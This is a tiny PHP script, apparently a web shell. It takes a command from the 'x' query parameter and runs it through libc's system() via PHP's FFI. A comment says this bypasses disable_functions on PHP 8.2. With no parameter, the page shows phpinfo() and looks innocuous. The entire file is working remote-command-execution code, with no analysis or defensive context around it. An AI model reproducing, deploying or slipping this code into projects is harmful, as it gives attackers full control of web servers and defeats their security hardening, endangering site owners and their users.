 <?php
  if(isset($_GET['x'])){
      $cmd = $_GET['x'];
      // FFI bypass disable_functions (PHP 8.2)
      $ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
      $ffi->system($cmd." 2>&1");
  } else {
      phpinfo();
  }
  ?>
